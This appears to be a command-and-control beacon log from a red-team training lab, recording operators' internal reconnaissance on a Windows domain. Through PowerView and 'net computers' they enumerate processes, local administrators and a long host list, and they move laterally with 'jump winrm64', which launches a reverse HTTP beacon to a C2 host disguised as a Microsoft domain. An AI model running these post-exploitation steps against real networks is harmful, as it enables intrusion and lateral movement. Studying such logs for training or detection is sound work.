@@ -1,0 +1,2357 @@
+03/30 08:41:27 UTC [metadata] 13.81.175.116 <- 10.1.3.10; computer: L-WIN223; user: w.tax; process: mousedrivercontrol.exe; pid: 5192; os: Windows; version: 6.2; beacon arch: x64 (x64)
+03/30 08:42:36 UTC [input] <MarcS> ps
+03/30 08:42:36 UTC [task] <T1057> Tasked beacon to list processes
+03/30 08:42:39 UTC [checkin] host called home, sent: 12 bytes
+03/30 08:42:39 UTC [output]
+[System Process]	0	0
+System	0	4
+Registry	4	88
+smss.exe	4	404
+csrss.exe	504	512
+wininit.exe	504	588
+csrss.exe	580	596
+winlogon.exe	580	684
+services.exe	588	700
+lsass.exe	588	732
+svchost.exe	700	832
+fontdrvhost.exe	588	844
+fontdrvhost.exe	684	856
+svchost.exe	700	920
+svchost.exe	700	972
+svchost.exe	700	1016
+LogonUI.exe	684	600
+dwm.exe	684	652
+svchost.exe	700	1032
+svchost.exe	700	1040
+svchost.exe	700	1096
+svchost.exe	700	1104
+svchost.exe	700	1144
+svchost.exe	700	1176
+svchost.exe	700	1236
+svchost.exe	700	1264
+svchost.exe	700	1300
+svchost.exe	700	1364
+svchost.exe	700	1400
+svchost.exe	700	1444
+svchost.exe	700	1452
+svchost.exe	700	1572
+svchost.exe	700	1588
+svchost.exe	700	1620
+svchost.exe	700	1712
+svchost.exe	700	1768
+svchost.exe	700	1792
+svchost.exe	700	1824
+svchost.exe	700	1840
+svchost.exe	700	1880
+svchost.exe	700	1944
+svchost.exe	700	1972
+svchost.exe	700	1980
+svchost.exe	700	2000
+svchost.exe	700	2028
+VSSVC.exe	700	2152
+Memory Compression	4	2204
+svchost.exe	700	2224
+svchost.exe	700	2252
+svchost.exe	700	2300
+svchost.exe	700	2352
+svchost.exe	700	2388
+svchost.exe	700	2496
+svchost.exe	700	2524
+svchost.exe	700	2604
+svchost.exe	700	2612
+svchost.exe	700	2712
+svchost.exe	700	2764
+svchost.exe	700	2816
+svchost.exe	700	2828
+svchost.exe	700	2912
+spoolsv.exe	700	2972
+svchost.exe	700	3024
+OfficeClickToRun.exe	700	3084
+svchost.exe	700	3184
+svchost.exe	700	3192
+svchost.exe	700	3200
+svchost.exe	700	3216
+WaAppAgent.exe	700	3264
+sysmon64.exe	700	3280
+svchost.exe	700	3292
+svchost.exe	700	3316
+MsMpEng.exe	700	3324
+WindowsAzureGuestAgent.exe	700	3336
+WindowsAzureNetAgent.exe	700	3368
+WindowsAzureTelemetryService.exe	700	3428
+svchost.exe	700	3492
+svchost.exe	700	3552
+svchost.exe	700	3688
+VFPlugin.exe	3368	3812
+conhost.exe	3812	3856
+unsecapp.exe	920	1744
+WmiPrvSE.exe	920	3236
+svchost.exe	700	4304
+svchost.exe	700	4352
+svchost.exe	700	4616
+svchost.exe	700	4648
+WmiPrvSE.exe	920	4680
+NisSrv.exe	700	4836
+svchost.exe	700	4884
+svchost.exe	700	4912
+taskhostw.exe	1144	2124
+svchost.exe	700	4016
+svchost.exe	700	5240
+svchost.exe	700	5284
+csrss.exe	5752	5760
+winlogon.exe	5752	5804
+fontdrvhost.exe	5804	5892
+dwm.exe	5804	5940
+svchost.exe	700	6128
+rdpclip.exe	1040	5588	x64	STROOP\w.tax	2
+sihost.exe	1444	808	x64	STROOP\w.tax	2
+svchost.exe	700	5556	x64	STROOP\w.tax	2
+svchost.exe	700	4084	x64	STROOP\w.tax	2
+taskhostw.exe	1144	5008	x64	STROOP\w.tax	2
+svchost.exe	700	5116
+svchost.exe	700	6292
+ctfmon.exe	6292	6348	x64	STROOP\w.tax	2
+svchost.exe	700	6408
+explorer.exe	6420	6500	x64	STROOP\w.tax	2
+svchost.exe	700	6748	x64	STROOP\w.tax	2
+ShellExperienceHost.exe	920	6960	x64	STROOP\w.tax	2
+SearchUI.exe	920	7076	x64	STROOP\w.tax	2
+RuntimeBroker.exe	920	7160	x64	STROOP\w.tax	2
+RuntimeBroker.exe	920	6156	x64	STROOP\w.tax	2
+WaSecAgentProv.exe	3264	7512
+conhost.exe	7512	7592
+RuntimeBroker.exe	920	7824	x64	STROOP\w.tax	2
+SearchIndexer.exe	700	7900
+SearchProtocolHost.exe	7900	8040
+SearchFilterHost.exe	7900	8064
+smartscreen.exe	920	8144	x64	STROOP\w.tax	2
+SecurityHealthSystray.exe	6500	6924	x64	STROOP\w.tax	2
+SecurityHealthService.exe	700	5136
+svchost.exe	700	5512
+mousedrivercontrol.exe	6500	5192	x64	STROOP\w.tax	2
+svchost.exe	700	7424
+svchost.exe	700	6940
+svchost.exe	700	892
+POWERPNT.EXE	6500	1508	x86	STROOP\w.tax	2
+svchost.exe	700	2060
+sppsvc.exe	700	3436
+RuntimeBroker.exe	920	4896	x64	STROOP\w.tax	2
+msiexec.exe	700	6644
+svchost.exe	700	6464
+SgrmBroker.exe	700	5296
+svchost.exe	700	6984
+svchost.exe	700	7344
+svchost.exe	700	6524	x64	STROOP\w.tax	2
+
+
+03/30 08:42:55 UTC [input] <MarcS> powershell-import
+03/30 08:43:10 UTC [input] <neo> powershell-import
+03/30 08:43:13 UTC [task] <T1086, T1064> Tasked beacon to import: C:\Users\outflank\Desktop\Training\Lab7 - internal recon\PowerView.ps1
+03/30 08:43:17 UTC [checkin] host called home, sent: 101224 bytes
+03/30 08:43:22 UTC [input] <neo> powershell Get-NetLocalGroup -computername l-win224
+03/30 08:43:23 UTC [task] <T1086> Tasked beacon to run: Get-NetLocalGroup -computername l-win224
+03/30 08:43:27 UTC [checkin] host called home, sent: 377 bytes
+03/30 08:43:31 UTC [output]
+received output:
+#< CLIXML
+
+
+ComputerName : l-win224
+AccountName  : STROOP/l-win224/bofh
+IsDomain     : False
+IsGroup      : False
+SID          : S-1-5-21-1770739200-3703860189-1291868052-500
+Description  : Built-in account for administering the computer/domain
+PwdLastSet   : 3/29/2020 2:17:31 AM
+PwdExpired   : False
+UserFlags    : 66049
+Disabled     : False
+LastLogin    : 3/30/2020 8:40:18 AM
+
+ComputerName : l-win224
+AccountName  : stroop.local/Domain Admins
+IsDomain     : True
+IsGroup      : True
+SID          : S-1-5-21-2163199188-2306780613-1636707950-512
+Description  : 
+Disabled     : 
+LastLogin    : 
+PwdLastSet   : 
+PwdExpired   : 
+UserFlags    : 
+
+ComputerName : l-win224
+AccountName  : stroop.local/Domain Users
+IsDomain     : True
+IsGroup      : True
+SID          : S-1-5-21-2163199188-2306780613-1636707950-513
+Description  : 
+Disabled     : 
+LastLogin    : 
+PwdLastSet   : 
+PwdExpired   : 
+UserFlags    : 
+
+
+
+<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04"><Obj S="progress" RefId="0"><TN RefId="0"><T>System.Management.Automation.PSCustomObject</T><T>System.Object</T></TN><MS><I64 N="SourceId">1</I64><PR N="Record"><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj></Objs>
+
+03/30 08:44:06 UTC [input] <neo> jump winrm64 L-WIN224 DFApache
+03/30 08:44:06 UTC [task] <T1028, T1086> Tasked beacon to run windows/beacon_http/reverse_http (ajax.microsoft.com:80) on L-WIN224 via WinRM
+03/30 08:44:09 UTC [checkin] host called home, sent: 226917 bytes
+03/30 08:44:19 UTC [output]
+received output:
+#< CLIXML
+
+
+03/30 08:46:51 UTC [input] <neo> net computers stroop.local
+03/30 08:46:51 UTC [task] <T1018, T1093> Tasked beacon to run net computers on stroop.local
+03/30 08:46:52 UTC [checkin] host called home, sent: 104509 bytes
+03/30 08:46:53 UTC [output]
+received output:
+Computers in domain 'stroop.local':
+
+ Server Name             IP Address                      
+ -----------             ----------                      
+ S-WIN21                 10.1.2.10
+ S-WIN22                 10.2.1.10
+ s-win100                unknown
+ s-win101                unknown
+ s-win102                unknown
+ s-win103                unknown
+ s-win104                unknown
+ s-win105                unknown
+ s-win106                unknown
+ s-win107                unknown
+ s-win108                unknown
+ s-win109                unknown
+ s-win110                unknown
+ s-win111                unknown
+ s-win112                unknown
+ s-win113                unknown
+ s-win114                unknown
+ s-win115                unknown
+ s-win116                unknown
+ s-win117                unknown
+ s-win118                unknown
+ s-win119                unknown
+ s-win120                unknown
+ s-win121                unknown
+ s-win122                unknown
+ s-win123                unknown
+ s-win124                unknown
+ s-win125                unknown
+ s-win126                unknown
+ s-win127                unknown
+ s-win128                unknown
+ s-win129                unknown
+ s-win130                unknown
+ s-win131                unknown
+ s-win132                unknown
+ s-win133                unknown
+ s-win134                unknown
+ s-win135                unknown
+ s-win136                unknown
+ s-win137                unknown
+ s-win138                unknown
+ s-win139                unknown
+ s-win140                unknown
+ s-win141                unknown
+ s-win142                unknown
+ s-win143                unknown
+ s-win144                unknown
+ s-win145                unknown
+ l-win1000               unknown
+ l-win1001               unknown
+ l-win1002               unknown
+ l-win1003               unknown
+ l-win1004               unknown
+ l-win1005               unknown
+ l-win1006               unknown
+ l-win1007               unknown
+ l-win1008               unknown
+ l-win1009               unknown
+ l-win1010               unknown
+ l-win1011               unknown
+ l-win1012               unknown
+ l-win1013               unknown
+ l-win1014               unknown
+ l-win1015               unknown
+ l-win1016               unknown
+ l-win1017               unknown
+ l-win1018               unknown
+ l-win1019               unknown
+ l-win1020               unknown
+ l-win1021               unknown
+ l-win1022               unknown
+ l-win1023               unknown
+ l-win1024               unknown
+ l-win1025               unknown
+ l-win1026               unknown
+ l-win1027               unknown
+ l-win1028               unknown
+ l-win1029               unknown
+ l-win1030               unknown
+ l-win1031               unknown
+ l-win1032               unknown
+ l-win1033               unknown
+ l-win1034               unknown
+ l-win1035               unknown
+ l-win1036               unknown
+ l-win1037               unknown
+ l-win1038               unknown
+ l-win1039               unknown
+ l-win1040               unknown
+ l-win1041               unknown
+ l-win1042               unknown
+ l-win1043               unknown
+ l-win1044               unknown
+ l-win1045               unknown
+ l-win1046               unknown
+ l-win1047               unknown
+ l-win1048               unknown
+ l-win1049               unknown
+ l-win1050               unknown
+ l-win1051               unknown
+ l-win1052               unknown
+ l-win1053               unknown
+ l-win1054               unknown
+ l-win1055               unknown
+ l-win1056               unknown
+ l-win1057               unknown
+ l-win1058               unknown
+ l-win1059               unknown
+ l-win1060               unknown
+ l-win1061               unknown
+ l-win1062               unknown
+ l-win1063               unknown
+ l-win1064               unknown
+ l-win1065               unknown
+ l-win1066               unknown
+ l-win1067               unknown
+ l-win1068               unknown
+ l-win1069               unknown
+ l-win1070               unknown
+ l-win1071               unknown
+ l-win1072               unknown
+ l-win1073               unknown
+ l-win1074               unknown
+ l-win1075               unknown
+ l-win1076               unknown
+ l-win1077               unknown
+ l-win1078               unknown
+ l-win1079               unknown
+ l-win1080               unknown
+ l-win1081               unknown
+ l-win1082               unknown
+ l-win1083               unknown
+ l-win1084               unknown
+ l-win1085               unknown
+ l-win1086               unknown
+ l-win1087               unknown
+ l-win1088               unknown
+ l-win1089               unknown
+ l-win1090               unknown
+ l-win1091               unknown
+ l-win1092               unknown
+ l-win1093               unknown
+ l-win1094               unknown
+ l-win1095               unknown
+ l-win1096               unknown
+ l-win1097               unknown
+ l-win1098               unknown
+ l-win1099               unknown
+ l-win1100               unknown
+ l-win1101               unknown
+ l-win1102               unknown
+ l-win1103               unknown
+ l-win1104               unknown
+ l-win1105               unknown
+ l-win1106               unknown
+ l-win1107               unknown
+ l-win1108               unknown
+ l-win1109               unknown
+ l-win1110               unknown
+ l-win1111               unknown
+ l-win1112               unknown
+ l-win1113               unknown
+ l-win1114               unknown
+ l-win1115               unknown
+ l-win1116               unknown
+ l-win1117               unknown
+ l-win1118               unknown
+ l-win1119               unknown
+ l-win1120               unknown
+ l-win1121               unknown
+ l-win1122               unknown
+ l-win1123               unknown
+ l-win1124               unknown
+ l-win1125               unknown
+ l-win1126               unknown
+ l-win1127               unknown
+ l-win1128               unknown
+ l-win1129               unknown
+ l-win1130               unknown
+ l-win1131               unknown
+ l-win1132               unknown
+ l-win1133               unknown
+ l-win1134               unknown
+ l-win1135               unknown
+ l-win1136               unknown
+ l-win1137               unknown
+ l-win1138               unknown
+ l-win1139               unknown
+ l-win1140               unknown
+ l-win1141               unknown
+ l-win1142               unknown
+ l-win1143               unknown
+ l-win1144               unknown
+ l-win1145               unknown
+ l-win1146               unknown
+ l-win1147               unknown
+ l-win1148               unknown
+ l-win1149               unknown
+ l-win1150               unknown
+ l-win1151               unknown
+ l-win1152               unknown
+ l-win1153               unknown
+ l-win1154               unknown
+ l-win1155               unknown
+ l-win1156               unknown
+ l-win1157               unknown
+ l-win1158               unknown
+ l-win1159               unknown
+ l-win1160               unknown
+ l-win1161               unknown
+ l-win1162               unknown
+ l-win1163               unknown
+ l-win1164               unknown
+ l-win1165               unknown
+ l-win1166               unknown
+ l-win1167               unknown
+ l-win1168               unknown
+ l-win1169               unknown
+ l-win1170               unknown
+ l-win1171               unknown
+ l-win1172               unknown
+ l-win1173               unknown
+ l-win1174               unknown
+ l-win1175               unknown
+ l-win1176               unknown
+ l-win1177               unknown
+ l-win1178               unknown
+ l-win1179               unknown
+ l-win1180               unknown
+ l-win1181               unknown
+ l-win1182               unknown
+ l-win1183               unknown
+ l-win1184               unknown
+ l-win1185               unknown
+ l-win1186               unknown
+ l-win1187               unknown
+ l-win1188               unknown
+ l-win1189               unknown
+ l-win1190               unknown
+ l-win1191               unknown
+ l-win1192               unknown
+ l-win1193               unknown
+ l-win1194               unknown
+ l-win1195               unknown
+ l-win1196               unknown
+ l-win1197               unknown
+ l-win1198               unknown
+ l-win1199               unknown
+ l-win1200               unknown
+ l-win1201               unknown
+ l-win1202               unknown
+ l-win1203               unknown
+ l-win1204               unknown
+ l-win1205               unknown
+ l-win1206               unknown
+ l-win1207               unknown
+ l-win1208               unknown
+ l-win1209               unknown
+ l-win1210               unknown
+ l-win1211               unknown
+ l-win1212               unknown
+ l-win1213               unknown
+ l-win1214               unknown
+ l-win1215               unknown
+ l-win1216               unknown
+ l-win1217               unknown
+ l-win1218               unknown
+ l-win1219               unknown
+ l-win1220               unknown
+ l-win1221               unknown
+ l-win1222               unknown
+ l-win1223               unknown
+ l-win1224               unknown
+ l-win1225               unknown
+ l-win1226               unknown
+ l-win1227               unknown
+ l-win1228               unknown
+ l-win1229               unknown
+ l-win1230               unknown
+ l-win1231               unknown
+ l-win1232               unknown
+ l-win1233               unknown
+ l-win1234               unknown
+ l-win1235               unknown
+ l-win1236               unknown
+ l-win1237               unknown
+ l-win1238               unknown
+ l-win1239               unknown
+ l-win1240               unknown
+ l-win1241               unknown
+ l-win1242               unknown
+ l-win1243               unknown
+ l-win1244               unknown
+ l-win1245               unknown
+ l-win1246               unknown
+ l-win1247               unknown
+ l-win1248               unknown
+ l-win1249               unknown
+ l-win1250               unknown
+ l-win1251               unknown
+ l-win1252               unknown
+ l-win1253               unknown
+ l-win1254               unknown
+ l-win1255               unknown
+ l-win1256               unknown
+ l-win1257               unknown
+ l-win1258               unknown
+ l-win1259               unknown
+ l-win1260               unknown
+ l-win1261               unknown
+ l-win1262               unknown
+ l-win1263               unknown
+ l-win1264               unknown
+ l-win1265               unknown
+ l-win1266               unknown
+ l-win1267               unknown
+ l-win1268               unknown
+ l-win1269               unknown
+ l-win1270               unknown
+ l-win1271               unknown
+ l-win1272               unknown
+ l-win1273               unknown
+ l-win1274               unknown
+ l-win1275               unknown
+ l-win1276               unknown
+ l-win1277               unknown
+ l-win1278               unknown
+ l-win1279               unknown
+ l-win1280               unknown
+ l-win1281               unknown
+ l-win1282               unknown
+ l-win1283               unknown
+ l-win1284               unknown
+ l-win1285               unknown
+ l-win1286               unknown
+ l-win1287               unknown
+ l-win1288               unknown
+ l-win1289               unknown
+ l-win1290               unknown
+ l-win1291               unknown
+ l-win1292               unknown
+ l-win1293               unknown
+ l-win1294               unknown
+ l-win1295               unknown
+ l-win1296               unknown
+ l-win1297               unknown
+ l-win1298               unknown
+ l-win1299               unknown
+ l-win1300               unknown
+ l-win1301               unknown
+ l-win1302               unknown
+ l-win1303               unknown
+ l-win1304               unknown
+ l-win1305               unknown
+ l-win1306               unknown
+ l-win1307               unknown
+ l-win1308               unknown
+ l-win1309               unknown
+ l-win1310               unknown
+ l-win1311               unknown
+ l-win1312               unknown
+ l-win1313               unknown
+ l-win1314               unknown
+ l-win1315               unknown
+ l-win1316               unknown
+ l-win1317               unknown
+ l-win1318               unknown
+ l-win1319               unknown
+ l-win1320               unknown
+ l-win1321               unknown
+ l-win1322               unknown
+ l-win1323               unknown
+ l-win1324               unknown
+ l-win1325               unknown
+ l-win1326               unknown
+ l-win1327               unknown
+ l-win1328               unknown
+ l-win1329               unknown
+ l-win1330               unknown
+ l-win1331               unknown
+ l-win1332               unknown
+ l-win1333               unknown
+ l-win1334               unknown
+ l-win1335               unknown
+ l-win1336               unknown
+ l-win1337               unknown
+ l-win1338               unknown
+ l-win1339               unknown
+ l-win1340               unknown
+ l-win1341               unknown
+ l-win1342               unknown
+ l-win1343               unknown
+ l-win1344               unknown
+ l-win1345               unknown
+ l-win1346               unknown
+ l-win1347               unknown
+ l-win1348               unknown
+ l-win1349               unknown
+ l-win1350               unknown
+ l-win1351               unknown
+ l-win1352               unknown
+ l-win1353               unknown
+ l-win1354               unknown
+ l-win1355               unknown
+ l-win1356               unknown
+ l-win1357               unknown
+ l-win1358               unknown
+ l-win1359               unknown
+ l-win1360               unknown
+ l-win1361               unknown
+ l-win1362               unknown
+ l-win1363               unknown
+ l-win1364               unknown
+ l-win1365               unknown
+ l-win1366               unknown
+ l-win1367               unknown
+ l-win1368               unknown
+ l-win1369               unknown
+ l-win1370               unknown
+ l-win1371               unknown
+ l-win1372               unknown
+ l-win1373               unknown
+ l-win1374               unknown
+ l-win1375               unknown
+ l-win1376               unknown
+ l-win1377               unknown
+ l-win1378               unknown
+ l-win1379               unknown
+ l-win1380               unknown
+ l-win1381               unknown
+ l-win1382               unknown
+ l-win1383               unknown
+ l-win1384               unknown
+ l-win1385               unknown
+ l-win1386               unknown
+ l-win1387               unknown
+ l-win1388               unknown
+ l-win1389               unknown
+ l-win1390               unknown
+ l-win1391               unknown
+ l-win1392               unknown
+ l-win1393               unknown
+ l-win1394               unknown
+ l-win1395               unknown
+ l-win1396               unknown
+ l-win1397               unknown
+ l-win1398               unknown
+ l-win1399               unknown
+ l-win1400               unknown
+
+
+03/30 08:46:58 UTC [output]
+received output:
+ l-win1401               unknown
+ l-win1402               unknown
+ l-win1403               unknown
+ l-win1404               unknown
+ l-win1405               unknown
+ l-win1406               unknown
+ l-win1407               unknown
+ l-win1408               unknown
+ l-win1409               unknown
+ l-win1410               unknown
+ l-win1411               unknown
+ l-win1412               unknown
+ l-win1413               unknown
+ l-win1414               unknown
+ l-win1415               unknown
+ l-win1416               unknown
+ l-win1417               unknown
+ l-win1418               unknown
+ l-win1419               unknown
+ l-win1420               unknown
+ l-win1421               unknown
+ l-win1422               unknown
+ l-win1423               unknown
+ l-win1424               unknown
+ l-win1425               unknown
+ l-win1426               unknown
+ l-win1427               unknown
+ l-win1428               unknown
+ l-win1429               unknown
+ l-win1430               unknown
+ l-win1431               unknown
+ l-win1432               unknown
+ l-win1433               unknown
+ l-win1434               unknown
+ l-win1435               unknown
+ l-win1436               unknown
+ l-win1437               unknown
+ l-win1438               unknown
+ l-win1439               unknown
+ l-win1440               unknown
+ l-win1441               unknown
+ l-win1442               unknown
+ l-win1443               unknown
+ l-win1444               unknown
+ l-win1445               unknown
+ l-win1446               unknown
+ l-win1447               unknown
+ l-win1448               unknown
+ l-win1449               unknown
+ l-win1450               unknown
+ l-win1451               unknown
+ l-win1452               unknown
+ l-win1453               unknown
+ l-win1454               unknown
+ l-win1455               unknown
+ l-win1456               unknown
+ l-win1457               unknown
+ l-win1458               unknown
+ l-win1459               unknown
+ l-win1460               unknown
+ l-win1461               unknown
+ l-win1462               unknown
+ l-win1463               unknown
+ l-win1464               unknown
+ l-win1465               unknown
+ l-win1466               unknown
+ l-win1467               unknown
+ l-win1468               unknown
+ l-win1469               unknown
+ l-win1470               unknown
+ l-win1471               unknown
+ l-win1472               unknown
+ l-win1473               unknown
+ l-win1474               unknown
+ l-win1475               unknown
+ l-win1476               unknown
+ l-win1477               unknown
+ l-win1478               unknown
+ l-win1479               unknown
+ l-win1480               unknown
+ l-win1481               unknown
+ l-win1482               unknown
+ l-win1483               unknown
+ l-win1484               unknown
+ l-win1485               unknown
+ l-win1486               unknown
+ l-win1487               unknown
+ l-win1488               unknown
+ l-win1489               unknown
+ l-win1490               unknown
+ l-win1491               unknown
+ l-win1492               unknown
+ l-win1493               unknown
+ l-win1494               unknown
+ l-win1495               unknown
+ l-win1496               unknown
+ l-win1497               unknown
+ l-win1498               unknown
+ l-win1499               unknown
+ l-win1500               unknown
+ l-win1501               unknown
+ l-win1502               unknown
+ l-win1503               unknown
+ l-win1504               unknown
+ l-win1505               unknown
+ l-win1506               unknown
+ l-win1507               unknown
+ l-win1508               unknown
+ l-win1509               unknown
+ l-win1510               unknown
+ l-win1511               unknown
+ l-win1512               unknown
+ l-win1513               unknown
+ l-win1514               unknown
+ l-win1515               unknown
+ l-win1516               unknown
+ l-win1517               unknown
+ l-win1518               unknown
+ l-win1519               unknown
+ l-win1520               unknown
+ l-win1521               unknown
+ l-win1522               unknown
+ l-win1523               unknown
+ l-win1524               unknown
+ l-win1525               unknown
+ l-win1526               unknown
+ l-win1527               unknown
+ l-win1528               unknown
+ l-win1529               unknown
+ l-win1530               unknown
+ l-win1531               unknown
+ l-win1532               unknown
+ l-win1533               unknown
+ l-win1534               unknown
+ l-win1535               unknown
+ l-win1536               unknown
+ l-win1537               unknown
+ l-win1538               unknown
+ l-win1539               unknown
+ l-win1540               unknown
+ l-win1541               unknown
+ l-win1542               unknown
+ l-win1543               unknown
+ l-win1544               unknown
+ l-win1545               unknown
+ l-win1546               unknown
+ l-win1547               unknown
+ l-win1548               unknown
+ l-win1549               unknown
+ l-win1550               unknown
+ l-win1551               unknown
+ l-win1552               unknown
+ l-win1553               unknown
+ l-win1554               unknown
+ l-win1555               unknown
+ l-win1556               unknown
+ l-win1557               unknown
+ l-win1558               unknown
+ l-win1559               unknown
+ l-win1560               unknown
+ l-win1561               unknown
+ l-win1562               unknown
+ l-win1563               unknown
+ l-win1564               unknown
+ l-win1565               unknown
+ l-win1566               unknown
+ l-win1567               unknown
+ l-win1568               unknown
+ l-win1569               unknown
+ l-win1570               unknown
+ l-win1571               unknown
+ l-win1572               unknown
+ l-win1573               unknown
+ l-win1574               unknown
+ l-win1575               unknown
+ l-win1576               unknown
+ l-win1577               unknown
+ l-win1578               unknown
+ l-win1579               unknown
+ l-win1580               unknown
+ l-win1581               unknown
+ l-win1582               unknown
+ l-win1583               unknown
+ l-win1584               unknown
+ l-win1585               unknown
+ l-win1586               unknown
+ l-win1587               unknown
+ l-win1588               unknown
+ l-win1589               unknown
+ l-win1590               unknown
+ l-win1591               unknown
+ l-win1592               unknown
+ l-win1593               unknown
+ l-win1594               unknown
+ l-win1595               unknown
+ l-win1596               unknown
+ l-win1597               unknown
+ l-win1598               unknown
+ l-win1599               unknown
+ l-win1600               unknown
+ l-win1601               unknown
+ l-win1602               unknown
+ l-win1603               unknown
+ l-win1604               unknown
+ l-win1605               unknown
+ l-win1606               unknown
+ l-win1607               unknown
+ l-win1608               unknown
+ l-win1609               unknown
+ l-win1610               unknown
+ l-win1611               unknown
+ l-win1612               unknown
+ l-win1613               unknown
+ l-win1614               unknown
+ l-win1615               unknown
+ l-win1616               unknown
+ l-win1617               unknown
+ l-win1618               unknown
+ l-win1619               unknown
+ l-win1620               unknown
+ l-win1621               unknown
+ l-win1622               unknown
+ l-win1623               unknown
+ l-win1624               unknown
+ l-win1625               unknown
+ l-win1626               unknown
+ l-win1627               unknown
+ l-win1628               unknown
+ l-win1629               unknown
+ l-win1630               unknown
+ l-win1631               unknown
+ l-win1632               unknown
+ l-win1633               unknown
+ l-win1634               unknown
+ l-win1635               unknown
+ l-win1636               unknown
+ l-win1637               unknown
+ l-win1638               unknown
+ l-win1639               unknown
+ l-win1640               unknown
+ l-win1641               unknown
+ l-win1642               unknown
+ l-win1643               unknown
+ l-win1644               unknown
+ l-win1645               unknown
+ l-win1646               unknown
+ l-win1647               unknown
+ l-win1648               unknown
+ l-win1649               unknown
+ l-win1650               unknown
+ l-win1651               unknown
+ l-win1652               unknown
+ l-win1653               unknown
+ l-win1654               unknown
+ l-win1655               unknown
+ l-win1656               unknown
+ l-win1657               unknown
+ l-win1658               unknown
+ l-win1659               unknown
+ l-win1660               unknown
+ l-win1661               unknown
+ l-win1662               unknown
+ l-win1663               unknown
+ l-win1664               unknown
+ l-win1665               unknown
+ l-win1666               unknown
+ l-win1667               unknown
+ l-win1668               unknown
+ l-win1669               unknown
+ l-win1670               unknown
+ l-win1671               unknown
+ l-win1672               unknown
+ l-win1673               unknown
+ l-win1674               unknown
+ l-win1675               unknown
+ l-win1676               unknown
+ l-win1677               unknown
+ l-win1678               unknown
+ l-win1679               unknown
+ l-win1680               unknown
+ l-win1681               unknown
+ l-win1682               unknown
+ l-win1683               unknown
+ l-win1684               unknown
+ l-win1685               unknown
+ l-win1686               unknown
+ l-win1687               unknown
+ l-win1688               unknown
+ l-win1689               unknown
+ l-win1690               unknown
+ l-win1691               unknown
+ l-win1692               unknown
+ l-win1693               unknown
+ l-win1694               unknown
+ l-win1695               unknown
+ l-win1696               unknown
+ l-win1697               unknown
+ l-win1698               unknown
+ l-win1699               unknown
+ l-win1700               unknown
+ l-win1701               unknown
+ l-win1702               unknown
+ l-win1703               unknown
+ l-win1704               unknown
+ l-win1705               unknown
+ l-win1706               unknown
+ l-win1707               unknown
+ l-win1708               unknown
+ l-win1709               unknown
+ l-win1710               unknown
+ l-win1711               unknown
+ l-win1712               unknown
+ l-win1713               unknown
+ l-win1714               unknown
+ l-win1715               unknown
+ l-win1716               unknown
+ l-win1717               unknown
+ l-win1718               unknown
+ l-win1719               unknown
+ l-win1720               unknown
+ l-win1721               unknown
+ l-win1722               unknown
+ l-win1723               unknown
+ l-win1724               unknown
+ l-win1725               unknown
+ l-win1726               unknown
+ l-win1727               unknown
+ l-win1728               unknown
+ l-win1729               unknown
+ l-win1730               unknown
+ l-win1731               unknown
+ l-win1732               unknown
+ l-win1733               unknown
+ l-win1734               unknown
+ l-win1735               unknown
+ l-win1736               unknown
+ l-win1737               unknown
+ l-win1738               unknown
+ l-win1739               unknown
+ l-win1740               unknown
+ l-win1741               unknown
+ l-win1742               unknown
+ l-win1743               unknown
+ l-win1744               unknown
+ l-win1745               unknown
+ l-win1746               unknown
+ l-win1747               unknown
+ l-win1748               unknown
+ l-win1749               unknown
+ l-win1750               unknown
+ l-win1751               unknown
+ l-win1752               unknown
+ l-win1753               unknown
+ l-win1754               unknown
+ l-win1755               unknown
+ l-win1756               unknown
+ l-win1757               unknown
+ l-win1758               unknown
+ l-win1759               unknown
+ l-win1760               unknown
+ l-win1761               unknown
+ l-win1762               unknown
+ l-win1763               unknown
+ l-win1764               unknown
+ l-win1765               unknown
+ l-win1766               unknown
+ l-win1767               unknown
+ l-win1768               unknown
+ l-win1769               unknown
+ l-win1770               unknown
+ l-win1771               unknown
+ l-win1772               unknown
+ l-win1773               unknown
+ l-win1774               unknown
+ l-win1775               unknown
+ l-win1776               unknown
+ l-win1777               unknown
+ l-win1778               unknown
+ l-win1779               unknown
+ l-win1780               unknown
+ l-win1781               unknown
+ l-win1782               unknown
+ l-win1783               unknown
+ l-win1784               unknown
+ l-win1785               unknown
+ l-win1786               unknown
+ l-win1787               unknown
+ l-win1788               unknown
+ l-win1789               unknown
+ l-win1790               unknown
+ l-win1791               unknown
+ l-win1792               unknown
+ l-win1793               unknown
+ l-win1794               unknown
+ l-win1795               unknown
+ l-win1796               unknown
+ l-win1797               unknown
+ l-win1798               unknown
+ l-win1799               unknown
+ l-win1800               unknown
+ l-win1801               unknown
+ l-win1802               unknown
+ l-win1803               unknown
+ l-win1804               unknown
+ l-win1805               unknown
+ l-win1806               unknown
+ l-win1807               unknown
+ l-win1808               unknown
+ l-win1809               unknown
+ l-win1810               unknown
+ l-win1811               unknown
+ l-win1812               unknown
+ l-win1813               unknown
+ l-win1814               unknown
+ l-win1815               unknown
+ l-win1816               unknown
+ l-win1817               unknown
+ l-win1818               unknown
+ l-win1819               unknown
+ l-win1820               unknown
+ l-win1821               unknown
+ l-win1822               unknown
+ l-win1823               unknown
+ l-win1824               unknown
+ l-win1825               unknown
+ l-win1826               unknown
+ l-win1827               unknown
+ l-win1828               unknown
+ l-win1829               unknown
+ l-win1830               unknown
+ l-win1831               unknown
+ l-win1832               unknown
+ l-win1833               unknown
+ l-win1834               unknown
+ l-win1835               unknown
+ l-win1836               unknown
+ l-win1837               unknown
+ l-win1838               unknown
+ l-win1839               unknown
+ l-win1840               unknown
+ l-win1841               unknown
+ l-win1842               unknown
+ l-win1843               unknown
+ l-win1844               unknown
+ l-win1845               unknown
+ l-win1846               unknown
+ l-win1847               unknown
+ l-win1848               unknown
+ l-win1849               unknown
+ l-win1850               unknown
+ l-win1851               unknown
+ l-win1852               unknown
+ l-win1853               unknown
+ l-win1854               unknown
+ l-win1855               unknown
+ l-win1856               unknown
+ l-win1857               unknown
+ l-win1858               unknown
+ l-win1859               unknown
+ l-win1860               unknown
+ l-win1861               unknown
+ l-win1862               unknown
+ l-win1863               unknown
+ l-win1864               unknown
+ l-win1865               unknown
+ l-win1866               unknown
+ l-win1867               unknown
+ l-win1868               unknown
+ l-win1869               unknown
+ l-win1870               unknown
+ l-win1871               unknown
+ l-win1872               unknown
+ l-win1873               unknown
+ l-win1874               unknown
+ l-win1875               unknown
+ l-win1876               unknown
+ l-win1877               unknown
+ l-win1878               unknown
+
+
